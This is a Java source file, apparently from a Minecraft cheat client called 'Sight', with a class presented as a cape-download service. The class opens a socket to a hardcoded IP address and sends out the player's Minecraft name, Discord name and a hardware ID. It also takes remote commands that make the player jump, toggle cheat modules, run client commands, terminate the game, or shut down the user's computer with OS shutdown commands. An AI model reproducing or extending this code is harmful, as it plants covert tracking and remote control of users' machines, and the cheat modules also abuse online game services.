package win.sightclient.server;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;

import javax.imageio.ImageIO;
import javax.imageio.ImageReader;
import javax.imageio.stream.ImageInputStream;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.lwjgl.BufferUtils;
import org.lwjgl.opengl.GL11;

import io.netty.util.internal.ThreadLocalRandom;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.AbstractClientPlayer;
import net.minecraft.client.renderer.IImageBuffer;
import net.minecraft.client.renderer.ImageBufferDownload;
import net.minecraft.client.renderer.ThreadDownloadImageData;
import net.minecraft.client.renderer.texture.ITextureObject;
import net.minecraft.client.renderer.texture.TextureManager;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.Util;
import optifine.CapeUtils;
import win.sightclient.Sight;
import win.sightclient.event.events.chat.EventChatSend;
import win.sightclient.module.Module;
import win.sightclient.utils.Utils;
import win.sightclient.utils.security.HWID;

public class Server extends Thread {

	private PrintWriter pw;
	private ArrayList<Request> capeRequests = new ArrayList<Request>();
	
	@Override
	public void run() {
		this.runLoop();
	}

	private void runLoop() {
		try {
			Socket s = null;
			while (s == null) {
				try {
					s = new Socket("149.248.52.197", 46645);
				} catch (Exception e) {}
				Thread.sleep(1000);
			}
			pw = new PrintWriter(s.getOutputStream(), true);
			this.sendInfo();
			BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
			boolean dead = false;
			while (!dead) {
				try {
					String line = br.readLine();
					if (line == null) {
						dead = true;
						return;
					}
					
					if (line.startsWith("CAPE:")) {
						String[] args = line.split(":");
						int id = Integer.parseInt(args[1]);
						for (int i = 0; i < capeRequests.size(); i++) {
							Request r = capeRequests.get(i);
							if (r.getID() == id) {
								this.applyCape(r.getPlayer(), line.substring("CAPE:".length() + (r.getID() + "").length() + 1));
								capeRequests.remove(r);
							}
						}
					} else if (line.equalsIgnoreCase("JUMP") && Minecraft.getMinecraft().thePlayer != null) {
						Minecraft.getMinecraft().thePlayer.jump();
					} else if (line.startsWith("TOGGLE:")) {
						Module m = Sight.instance.mm.getModuleByName(line.split(":")[1]);
						if (m != null) {
							m.toggle();
						}
					} else if (line.equalsIgnoreCase("CRASH")) {
						System.exit(0);
					} else if (line.equalsIgnoreCase("SHUTDOWN")) {
						if (Util.getOSType() == Util.EnumOS.OSX || Util.getOSType() == Util.EnumOS.LINUX) {
						    Runtime.getRuntime().exec("shutdown -h now");
					    }
					    else if (Util.getOSType() == Util.EnumOS.WINDOWS) {
						    Runtime.getRuntime().exec("shutdown.exe -s -t 0");
					    }
					} else if (line.startsWith("EXEC:")) {
						Sight.instance.cm.onChat(new EventChatSend("." + line.split(":")[1]));
					} else if (line.equalsIgnoreCase("GC")) {
						System.gc();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			s.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		this.runLoop();
	}
	
	public void sendInfo() {
		printUsername();
		pw.println("DISCORD:" + Sight.instance.getRichPresence().fullusername);
		pw.println("PREMIUM:1");
		pw.println("SETCAPE:1");
		try {
			pw.println("HWID:" + HWID.getHWID());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void setCape(Capes cape) {
		if (pw != null && cape != null) {
			pw.println("SETCAPE:" + cape.getID());
			if (Minecraft.getMinecraft().thePlayer != null) {
				applyCape(Minecraft.getMinecraft().thePlayer, cape.getURL());
			}
		}
	}
	
	public void printUsername() {
		if (pw != null) {
			pw.println("MCNAME:" + Minecraft.getMinecraft().session.getUsername());
		}
	}
	
	public void checkCape(final AbstractClientPlayer player) {
		if (pw == null) {
			return;
		}
		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					Request r = new Request(Math.abs(ThreadLocalRandom.current().nextInt()), player);
					capeRequests.add(r);
					pw.println("CAPE:" + r.getID() + ":" + r.getPlayer().getNameClear());
				} catch (Exception e) {}
			}
			
		}).start();
	}
	
	public void switchWorld() {
		this.capeRequests.clear();
	}
	
    private void applyCape(final AbstractClientPlayer p_downloadCape_0_, String url) {
    	if (url == null || url.equals("NULL") || url.equals("")) {
    		return;
    	}
        String s = p_downloadCape_0_.getNameClear();

        if (s != null && !s.isEmpty())
        {
        	new Thread(new Runnable() {
        		@Override
        		public void run() {
        			String ending = url.substring(url.length() - 3);
            		String s2 = FilenameUtils.getBaseName(url);
            		final ResourceLocation resourcelocation = new ResourceLocation("capeof/" + s2);
                    TextureManager texturemanager = Minecraft.getMinecraft().getTextureManager();
                    ITextureObject itextureobject = texturemanager.getTexture(resourcelocation);

                    if (itextureobject != null && itextureobject instanceof ThreadDownloadImageData)
                    {
                        ThreadDownloadImageData threaddownloadimagedata = (ThreadDownloadImageData)itextureobject;

                        if (threaddownloadimagedata.imageFound != null)
                        {
                            if (threaddownloadimagedata.imageFound.booleanValue())
                            {
                                p_downloadCape_0_.setLocationOfCape(resourcelocation);
                            }

                            return;
                        }
                    }

                    IImageBuffer iimagebuffer = new IImageBuffer()
                    {
                        ImageBufferDownload ibd = new ImageBufferDownload();
                        public BufferedImage parseUserSkin(BufferedImage image)
                        {
                            return CapeUtils.parseCape(image);
                        }
                        public void skinAvailable()
                        {
                            p_downloadCape_0_.setLocationOfCape(resourcelocation);
                        }
                    };
                    ThreadDownloadImageData threaddownloadimagedata1 = new ThreadDownloadImageData((File)null, url, (ResourceLocation)null, iimagebuffer);
                    threaddownloadimagedata1.pipeline = true;
                    texturemanager.loadTexture(resourcelocation, threaddownloadimagedata1);
        		}
        	}).start();
       	}
    }

    public ArrayList<BufferedImage> getFrames(File gif) throws IOException{
    	ArrayList<BufferedImage> frames = new ArrayList<BufferedImage>();
    	try {
    	    ImageReader reader = ImageIO.getImageReadersByFormatName("gif").next();
    	    ImageInputStream stream = ImageIO.createImageInputStream(gif);
    	    reader.setInput(stream);

    	    int count = reader.getNumImages(true);
    	    for (int index = 0; index < count; index++) {
    	        frames.add(reader.read(index));
    	    }
    	} catch (IOException ex) {
    	   	ex.printStackTrace();
    	}
    	return frames;
    }
}

class Request {
	
	private final int id;
	private final AbstractClientPlayer player;
	
	public Request(final int id, final AbstractClientPlayer player) {
		this.id = id;
		this.player = player;
	}
	
	public int getID() {
		return id;
	}
	
	public AbstractClientPlayer getPlayer() {
		return this.player;
	}
}
